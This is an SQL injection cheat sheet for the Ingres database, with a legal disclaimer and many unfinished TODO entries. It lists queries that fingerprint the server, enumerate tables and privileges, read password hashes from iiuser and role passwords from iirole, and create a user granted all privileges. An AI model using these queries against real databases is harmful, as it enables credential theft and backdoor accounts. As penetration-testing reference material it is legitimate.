# Ingres-SQL injection CheatSheet
The information contained in this document is for general information purposes only. The information is provided by the document, we make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability or availability with respect to the document or the information, products, services, or related graphics contained on the document for any purpose. Any reliance you place on such information is therefore strictly at your own risk.

In no event will we be liable for any loss or damage including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this website or the use of scripts and techniques explained.

```You must also be aware that any use of the techniques detailled on this document against a system you do not own or have permission to test represent a crime.```



<table>
   <tbody>
   <tr>
     <th>Target</th>
     <th>Bullet</th>
   </tr>
      <tr>
         <td>Version</td>
         <td>select dbmsinfo(‘_version’);</td>
      </tr>
      <tr>
         <td>Comments</td>
         <td>SELECT 123; — comment<br>
            select 123; /* comment */
         </td>
      </tr>
      <tr>
         <td>Current User</td>
         <td>select dbmsinfo(‘session_user’);<br>
            select dbmsinfo(‘system_user’);
         </td>
      </tr>
      <tr>
         <td>List Users</td>
         <td>First connect to iidbdb, then:<br>
            SELECT name, password FROM&nbsp;iiuser; — or<br>
            SELECT own FROM iidatabase;
         </td>
      </tr>
      <tr>
         <td>Create Users</td>
         <td>create user testuser with password = ‘testuser’;– priv</td>
      </tr>
      <tr>
         <td>List Password Hashes</td>
         <td>First connect to iidbdb, then:<br>
            select name, password from iiuser;
         </td>
      </tr>
      <tr>
         <td>List Privileges</td>
         <td>select dbmsinfo(‘db_admin’);<br>
            select dbmsinfo(‘create_table’);<br>
            select dbmsinfo(‘create_procedure’);<br>
            select dbmsinfo(‘security_priv’);<br>
            select dbmsinfo(‘select_syscat’);<br>
            select dbmsinfo(‘db_privileges’);<br>
            select dbmsinfo(‘current_priv_mask’);
         </td>
      </tr>
      <tr>
         <td>List DBA Accounts</td>
         <td>TODO</td>
      </tr>
      <tr>
         <td>Current Database</td>
         <td>select dbmsinfo(‘database’);</td>
      </tr>
      <tr>
         <td>List Databases</td>
         <td>SELECT name FROM iidatabase; — connect to iidbdb</td>
      </tr>
      <tr>
         <td>List Columns</td>
         <td>select column_name, column_datatype, table_name, table_owner from iicolumns;</td>
      </tr>
      <tr>
         <td>List Tables</td>
         <td>select table_name, table_owner from iitables;<br>
            select relid, relowner, relloc from iirelation;<br>
            select relid, relowner, relloc from iirelation where relowner != ‘$ingres’;
         </td>
      </tr>
      <tr>
         <td>Find Tables From Column Name</td>
         <td>SELECT table_name, table_owner FROM iicolumns WHERE column_name = ‘value’</td>
      </tr>
      <tr>
         <td>Select Nth Row</td>
         <td>Astoundingly, this <a href="http://community.ingres.com/forums/viewtopic.php?p=6050">doesn’t</a>seem to be possible!&nbsp; This is as close as you can get:select top 10 blah from table;<br>
            select first 10 blah form table;
         </td>
      </tr>
      <tr>
         <td>Select Nth Char</td>
         <td>select substr(‘abc’, 2, 1); — returns ‘b’</td>
      </tr>
      <tr>
         <td>Bitwise AND</td>
         <td>The function “bit_and” exists, but seems hard to use.&nbsp; Here’s an<br>
            example of ANDing 3 and 5 together.&nbsp; The result is a “byte” type<br>
            with value ?01:select substr(bit_and(cast(3 as byte), cast(5 as byte)),1,1);
         </td>
      </tr>
      <tr>
         <td>ASCII Value -&gt; Char</td>
         <td>TODO</td>
      </tr>
      <tr>
         <td>Char -&gt; ASCII Value</td>
         <td>TODO<br>
            (The “ascii” function exists, but doesn’t seem to do what I’d expect.)
         </td>
      </tr>
      <tr>
         <td>Casting</td>
         <td>select cast(123 as varchar);<br>
            select cast(’123′ as integer);
         </td>
      </tr>
      <tr>
         <td>String Concatenation</td>
         <td>select ‘abc’ || ‘def’;</td>
      </tr>
      <tr>
         <td>If Statement</td>
         <td>TODO</td>
      </tr>
      <tr>
         <td>Case Statement</td>
         <td>TODO</td>
      </tr>
      <tr>
         <td>Avoiding Quotes</td>
         <td>TODO</td>
      </tr>
      <tr>
         <td>Time Delay</td>
         <td>???See <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0907.mspx">Heavy Queries</a> article for some ideas.</td>
      </tr>
      <tr>
         <td>Make DNS Requests</td>
         <td>TODO</td>
      </tr>
      <tr>
         <td>Command Execution</td>
         <td>Impossible?</td>
      </tr>
      <tr>
         <td>Local File Access</td>
         <td>TODO</td>
      </tr>
      <tr>
         <td>Hostname, IP Address</td>
         <td>SELECT dbmsinfo(‘ima_server’)</td>
      </tr>
      <tr>
         <td>Location of DB files</td>
         <td>SELECT dbdev, ckpdev, jnldev, sortdev FROM iidatabase WHERE name = ‘value’ — primary location of db<br>
            SELECT lname FROM iiextend WHERE dname = ‘value’ — extended location of db<br>
            SELECT are FROM iilocations where lname = ‘value’ –&nbsp;all area (ie directory) linked with a location
         </td>
      </tr>
      <tr>
         <td>Default/System Databases</td>
         <td>SELECT name FROM iidatabase WHERE own = ‘$ingres’ — connect to iidbdb</td>
      </tr>
      <tr>
         <td>Installing Locally</td>
         <td>The Ingres database can be downloaded for free from <a href="http://esd.ingres.com/">http://esd.ingres.com/</a><br>
            A pre-built Linux-based Ingres Database Server can be download from <a href="http://www.vmware.com/appliances/directory/832">http://www.vmware.com/appliances/directory/832</a>
         </td>
      </tr>
      <tr>
         <td>Database Client</td>
         <td>TODO<br>
            There is a client called “sql” which can be used for local connections (at least) in the&nbsp; database server package above.
         </td>
      </tr>
      <tr>
         <td>Logging in from command line</td>
         <td>$ su -&nbsp; ingres<br>
            $ sql iidbdb<br>
            * select dbmsinfo(‘_version’); go
         </td>
      </tr>
      <tr>
         <td>Identifying on the network</td>
         <td>TODO</td>
      </tr>
   </tbody>
</table>


<table>
   <tbody>
   <tr>
     <th>Target</th>
     <th>Bullet</th>
   </tr>
      <tr>
         <td>&nbsp;Batching Queries Allowed?</td>
         <td>Not via DBI in PERL.&nbsp; Subsequent statements seem to get ignored:<br>
            select blah from table where foo = 1; select … doesn’t matter this is ignored.
         </td>
      </tr>
      <tr>
         <td>&nbsp;FROM clause mandated in SELECTs?</td>
         <td>No.&nbsp; You don’t need to select form “dual” or anything.&nbsp; The following is legal:<br>
            select 1;
         </td>
      </tr>
      <tr>
         <td>&nbsp;UNION supported</td>
         <td>Yes.&nbsp; Nothing tricky here.&nbsp; The following is legal:<br>
            select 1 union select 2;
         </td>
      </tr>
      <tr>
         <td>&nbsp;Enumerate Tables Privs</td>
         <td>select table_name, permit_user, permit_type from iiaccess;</td>
      </tr>
      <tr>
         <td>&nbsp;Length of a string</td>
         <td>select length(‘abc’); — returns 3</td>
      </tr>
      <tr>
         <td>&nbsp;Roles and passwords</td>
         <td>First you need to connect to iidbdb, then:<br>
            select roleid, rolepass from iirole;
         </td>
      </tr>
      <tr>
         <td>List Database Procedures</td>
         <td>First you need to connect to iidbdb, then:<br>
            select dbp_name,&nbsp; dbp_owner from iiprocedure;
         </td>
      </tr>
      <tr>
         <td>Create Users + Granting Privs</td>
         <td>First you need to connect to iidbdb, then:<br>
            create user pm with password = ‘password’;<br>
            grant all on current installation to pm;
         </td>
      </tr>
   </tbody>
</table>
